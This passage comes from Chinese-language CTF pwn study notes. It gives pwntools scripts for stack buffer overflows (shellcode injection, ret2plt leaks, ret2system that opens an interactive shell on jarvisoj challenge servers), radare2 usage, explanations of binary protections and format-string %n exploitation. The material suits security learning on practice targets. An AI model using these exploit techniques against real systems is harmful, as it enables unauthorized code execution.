p32<span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span> <span class="token comment"># 地址转 32 位二进制</span>
payload <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x90'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x4</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>从write返回main</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#char[88] ebp  write函数地址  write函数返回地址(返回到main函数)  write函数参数一(1)  write函数参数二(write_got地址)  write函数参数三(写4字节)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># payload = flat('a'*0x88, p64(syscall), p64(syscall)) # buuctf这题需要2个，不明白。好像是栈没对齐的原因</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h4 id="输入字符"><a href="#输入字符" class="header-anchor">#</a> 输入字符</h4> <div class="language-python line-numbers-mode"><pre class="language-python"><code>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;your name&quot;</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h4 id="汇编转二进制、数字、字符转换等"><a href="#汇编转二进制、数字、字符转换等" class="header-anchor">#</a> 汇编转二进制、数字、字符转换等</h4> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">'XCHG EAX,ESP\nRET\nMOV ECX,[EAX]\nMOV [EDX],ECX\nPOP EBX\nRET'</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>p32</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> p32<span class="token punctuation">(</span><span class="token number">0x8040000</span><span class="token punctuation">)</span>
<span class="token string">b'\x00\x00\x04\x08'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>u32使用</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> u32<span class="token punctuation">(</span><span class="token string">'\x00\x00\x04\x08'</span><span class="token punctuation">)</span>
<span class="token number">134479872</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">'\x00\x00\x04\x08'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token string">'0x8040000'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="runshellcode"><a href="#runshellcode" class="header-anchor">#</a> runshellcode</h4> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
run_shellcode<span class="token punctuation">(</span>a<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="相关知识"><a href="#相关知识" class="header-anchor">#</a> 相关知识</h3> <p>通过ldd查找libc共享库， 这里python需要用到c语言的标准动态库, srand用到libc.so.6</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>kali@kali:/mnt/hgfs/vmware$ ldd guess_num 
        linux-vdso.so.1 <span class="token punctuation">(</span>0x00007ffec67fa000<span class="token punctuation">)</span>
        libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/x86_64-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0x00007faeab4e3000<span class="token punctuation">)</span>
        /lib64/ld-linux-x86-64.so.2 <span class="token punctuation">(</span>0x00007faeab8c1000<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="one-gadget"><a href="#one-gadget" class="header-anchor">#</a> one_gadget</h2> <p>one_gadget libc_32.so.6
https://xz.aliyun.com/t/6598</p> <p>one_gadget 之前,我们一般都是通过常规 rop 的方式 getshell .有了它之后,知道 libc 偏移就能够通过它的地址一步 getshell .详细介绍参见<a href="https://xz.aliyun.com/t/2720" target="_blank" rel="noopener noreferrer">此处<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h2 id="radare2使用"><a href="#radare2使用" class="header-anchor">#</a> radare2使用</h2> <p>r2 ./bof</p> <p>aa分析</p> <p>afl看函数 analysis function list</p> <p>跳到main
s main
s 0x1234地址
V 看内存
VV 进入virtual mode，能看图</p> <p>s sym.hidden
VV
看绿色 call sym.imp.system 参数是 bin/sh
s sym.main(转到main)</p> <p>执行
./bof1</p> <p>光标处按:提示:&gt; 修改，
:&gt; afvn改名字
local_10h 改为 input
:&gt; afvn input local_10h</p> <p>aa 分析
aaa 分析 一般用这个够了
aaaa 分析</p> <h2 id="练习"><a href="#练习" class="header-anchor">#</a> 练习</h2> <h4 id="_1-内存泄漏"><a href="#_1-内存泄漏" class="header-anchor">#</a> 1. 内存泄漏</h4> <p>1.内存泄漏 xman_level0 <a href="https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d" target="_blank" rel="noopener noreferrer">file<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <div class="language- extra-class"><pre><code>nc pwn2.jarvisoj.com 9881
# 覆盖 填充长度 + 一个bp 大小(8bytes)
</code></pre></div><p>思路：</p> <p>扔进IDA看strings, 有bin/sh, 进入按X，看函数调用地址。</p> <p>左侧函数窗口，看main函数</p> <div class="language- extra-class"><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  write(1, &quot;Hello, World\n&quot;, 0xDuLL);
  return vulnerable_function();
}
</code></pre></div><p>看 vulnerable_function</p> <div class="language- extra-class"><pre><code>ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h] # 读buf 占 0x80，双击进入，
  return read(0, &amp;buf, 0x200uLL); # 就读入 0x200， 即16*16*2 =512个bytes
}

# buf 
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?) 
+0000000000000008  r              db 8 dup(?) # 存放返回地址， 多空余0x8字节，加上前面的0x80字节，就是0x88个字节
</code></pre></div><p>read可以读入0x200，即512个字符，而从buf到vulnerable_function的返回地址只有0x80+0x8,即 136个字节 &lt; 512，因此可以覆盖 vulnerable_function 的返回地址为 call_system 函数地址，即可getshell</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># -*- coding:utf-8 -*-</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;pwn2.jarvisoj.com&quot;</span><span class="token punctuation">,</span><span class="token number">9881</span><span class="token punctuation">)</span> 
junk <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token comment"># 随意填充0x80个，</span>


fakebp <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token comment"># 看char buf，双击进buf，最下面还有8个bytes</span>
syscall <span class="token operator">=</span> <span class="token number">0x0000000000400596</span> <span class="token comment"># ida 查看 exports 填入地址</span>
payload <span class="token operator">=</span> junk <span class="token operator">+</span> fakebp <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token comment"># 正常是vulnerable_function()返回地址，我们这里覆盖为syscall地址，得到shell</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h4 id="读取-symbol-system的地址"><a href="#读取-symbol-system的地址" class="header-anchor">#</a> 读取 symbol system的地址</h4> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;pwn2.jarvisoj.com&quot;</span><span class="token punctuation">,</span><span class="token number">9878</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./level2&quot;</span><span class="token punctuation">)</span>

sys_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&quot;system&quot;</span><span class="token punctuation">]</span>                     <span class="token comment"># IDA对应的函数为 _system 0x08048320</span>
bin_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># IDA可见 0x804a024</span>

payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span>                 <span class="token comment">#辣鸡填充值</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin'</span><span class="token punctuation">)</span>   <span class="token comment">#覆盖返回地址到system函数</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin'</span><span class="token punctuation">)</span> <span class="token comment">#随意填写system函数调用结束的返回地址 0x1也行</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin'</span><span class="token punctuation">)</span>   <span class="token comment">#system函数的参数，指向“/bin/sh”，实现调用</span>

io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h2 id="wiki"><a href="#wiki" class="header-anchor">#</a> Wiki</h2> <h3 id="checksec-、-二进制保护机制"><a href="#checksec-、-二进制保护机制" class="header-anchor">#</a> checksec 、 二进制保护机制</h3> <p><strong>0x00 checksec</strong></p> <p>打开了RELRO、Canary和NX，那就没办法做栈溢出了。</p> <p>这里主要讲的是CTF中linux下的ELF二进制文件的保护机制。在linux中有一个脚本checksec命令可以查看当前二进制文件的保护机制。任意安装一款gdb插件都会把checksec脚本包含进来。</p> <div class="language- extra-class"><pre><code>在gdb中执行：
gdb&gt; checksec test
Canary                      : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                        : Partial

直接在shell中执行：
$ checksec test
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
可以看到checksec可以查看当前二进制文件的指令架构以及采取了哪些保护机制。
</code></pre></div><p>示例2</p> <div class="language- extra-class"><pre><code>确定保护 

jarvisOJ_typo [master●●] check ./typo
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
[*] '/home/m4x/pwn_repo/jarvisOJ_typo/typo'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
静态链接的程序，没有开栈溢出保护和 PIE; 静态链接说明我们可以在 binary 里找到 system 等危险函数和 &quot;/bin/sh&quot; 等敏感字符串，因为又是 No PIE， 所以我们只需要栈溢出就能构造 ropchain 来 get shell
</code></pre></div><hr> <p><strong>0x01 二进制保护机制</strong></p> <p><strong>1.Canary（栈保护）</strong></p> <p>这个选项表示栈保护功能有没有开启。</p> <p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p> <p><strong>2.NX/DEP（堆栈不可执行）</strong></p> <p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p> <p><img src="/text_del/assets/img/pwn03.4810bda5.png" alt="Alt text"></p> <p><strong>3.PIE/ASLR（地址随机化）</strong></p> <p>开启后地址变量地址不固定</p> <p>__4.Fortify __</p> <p>这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p> <p><strong>5.RelRO</strong></p> <p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p> <p>0x02 <a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener noreferrer">参考<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h3 id="栈"><a href="#栈" class="header-anchor">#</a> 栈</h3> <p>参数入栈方式是从右向左。</p> <p><img src="/text_del/assets/img/pwn_stack01.2dfb902a.jpg" alt="Alt text"></p> <h3 id="c代码翻译"><a href="#c代码翻译" class="header-anchor">#</a> C代码翻译</h3> <p><code>_readfsqword(0x28u)</code> 通常用于alarm函数，防止调试</p> <p><code>strcmp(str1,str2)</code> ，若str1=str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数</p> <h3 id="c语言各数据类型大小和取值范围"><a href="#c语言各数据类型大小和取值范围" class="header-anchor">#</a> C语言各数据类型大小和取值范围</h3> <p><a href="http://shell-storm.org/shellcode/files/syscalls.html" target="_blank" rel="noopener noreferrer">Linux System Call Table<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener noreferrer">LINUX SYSTEM CALL TABLE FOR X86 64<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>有符号整数类型</p> <table><thead><tr><th>类型名称</th> <th>字节数</th> <th>取值范围</th></tr></thead> <tbody><tr><td>signed char</td> <td>1</td> <td>-2^7(-128) ~ 2^7-1(127)</td></tr> <tr><td>short int 或 short</td> <td>2</td> <td>-2^15(-32 768) ~ 2^15-1(32 767)</td></tr> <tr><td>int</td> <td>4</td> <td>-2^31(-2 147 483 648) ~ 2^31-1(2 147 483 647)</td></tr> <tr><td>long int 或 long</td> <td>4</td> <td>-2^31(-2 147 483 648) ~ 2^31-1(2 147 483 647)</td></tr> <tr><td>long long int 或 long long</td> <td>8</td> <td>-2^63(-9.2233720368548e+18) ~ 2^63-1(9.2233720368548e+18)</td></tr></tbody></table> <p>无符号整数类型</p> <table><thead><tr><th>类型名称</th> <th>字节数</th> <th>取值范围</th></tr></thead> <tbody><tr><td>unsigned char</td> <td>1</td> <td>0 ~ 2^8-1(255)</td></tr> <tr><td>unsigned short int 或 unsigned short</td> <td>2</td> <td>0 ~ 2^16-1(65 535)</td></tr> <tr><td>unsigned int</td> <td>4</td> <td>0 ~ 2^32-1(4 294 967 295)</td></tr> <tr><td>unsigned long int 或 unsigned long</td> <td>4</td> <td>0 ~ 2^32-1(4 294 967 295)</td></tr> <tr><td>unsigned long long int 或 unsigned long long</td> <td>8</td> <td>0 ~ 2^64-1(1.844674407371e+19)</td></tr></tbody></table> <p>浮点类型</p> <table><thead><tr><th>类型名称</th> <th>字节数</th> <th>取值范围</th></tr></thead> <tbody><tr><td>float</td> <td>4</td> <td>-/+3.4e38（精确到6位小数）</td></tr> <tr><td>double</td> <td>8</td> <td>-/+1.7e308（精确到15位小数）</td></tr> <tr><td>long double</td> <td>12</td> <td>-/+1.19e4932（精确到18位小数）</td></tr></tbody></table> <p>极限值符号</p> <p>表示有符号整数类型的极限值符号</p> <table><thead><tr><th>类型名称</th> <th>下限</th> <th>上限</th></tr></thead> <tbody><tr><td>char</td> <td>CHAR_MIN</td> <td>CHAR_MAX</td></tr> <tr><td>short</td> <td>SHRT_MIN</td> <td>SHRT_MAX</td></tr> <tr><td>int</td> <td>INT_MIN</td> <td>INT_MAX</td></tr> <tr><td>long</td> <td>LONG_MIN</td> <td>LONG_MAX</td></tr> <tr><td>long long</td> <td>LLONG_MIN</td> <td>LLONG_MAX</td></tr></tbody></table> <p>表示无符号整数类型的极限值符号</p> <table><thead><tr><th>类型名称</th> <th>下限</th> <th>上限</th></tr></thead> <tbody><tr><td>unsigned char</td> <td>0</td> <td>UCHAR_MAX</td></tr> <tr><td>unsigned short</td> <td>0</td> <td>USHRT_MAX</td></tr> <tr><td>unsigned int</td> <td>0</td> <td>UINT_MAX</td></tr> <tr><td>unsigned long</td> <td>0</td> <td>ULONG_MAX</td></tr> <tr><td>unsigned long long</td> <td>0</td> <td>ULLONG_MAX</td></tr></tbody></table> <p>表示浮点类型的极限值符号</p> <table><thead><tr><th>类型名称</th> <th>下限</th> <th>上限</th></tr></thead> <tbody><tr><td>float</td> <td>FLT_MIN</td> <td>FLT_MAX</td></tr> <tr><td>double</td> <td>DBL_MIN</td> <td>DBL_MAX</td></tr> <tr><td>long double</td> <td>LDBL_MIN</td> <td>LDBL_MAX</td></tr></tbody></table> <h3 id="printf"><a href="#printf" class="header-anchor">#</a> printf</h3> <div class="language- extra-class"><pre><code>%d - 十进制 - 输出十进制整数
%s - 字符串 - 从内存中读取字符串
%x - 十六进制 - 输出十六进制数
%c - 字符 - 输出字符
%p - 指针 - 指针地址
%n - 到目前为止所写的字符数,%n这个格式化字符串，它的功能是将%n之前打印出来的字符个数，赋值给一个变量，例如这样：
     可以理解成 %n 是对变量赋值, 值为长度数
     %?$n 向栈内第?个指向的 地址处写入字符串长度。
     比如栈内第2个值为0x40056a, %85c%2$n，就是向地址0x40056a写入85
</code></pre></div><p><a href="https://blog.csdn.net/qinying001/article/details/98527949" target="_blank" rel="noopener noreferrer">Link<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 可以理解成 %n 是对变量赋值, 值为长度数</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Hello world%n&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;%d\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment">// Hello world11, a的值被改变了, gcc编译下。</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>任意内存读取</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>#include &lt;stdio.h&gt;
int (){
        char str[100];
        scanf(&quot;%s&quot;,str);
        printf(str);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>任意内存写入</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>printf(&quot;addr%m$n&quot;,&amp;arg);
在addr地址的第m个参数写入4个字节(addr)的数据，arg=4
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>%85c%7$n ，作用是将85写入栈内第7个参数所指向的地址。</p> <p>在 printf 中，使用 <code>*&lt;a_number_of_chars&gt;%&lt;number&gt;$n*</code> 就可以将相应的第 <code>*&lt;number&gt;*</code> 个参数的位置写为 % 前输出的字符数量</p> <p>如本题先用 %85c 输出了85个字符，再用 %7$n 将第七个参数的位置写成了85</p> <h4 id="的作用"><a href="#的作用" class="header-anchor">#</a> $的作用</h4> <p>Linux下, x$指栈第x个参数的地址, 下面2$指第2个地址, $1指第一个地址. 即输出2, 3</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;%2$d %1$d&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h4 id="示例-cgfsb"><a href="#示例-cgfsb" class="header-anchor">#</a> 示例 CGfsb</h4> <p>通常2次输入</p> <div class="language- extra-class"><pre><code>1.1111
2.输入 aaaa-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x-%08x
aaaa-ffffd22e-f7fb4580-00000001-00000000-00000001-f7ffd940-31310001-000a3131-00000000-61616161-3830252d-30252d78
***1-*******2-*******3-*******4-*******5-*******6-*******7-*******8-*******9-******10-*'1111'*
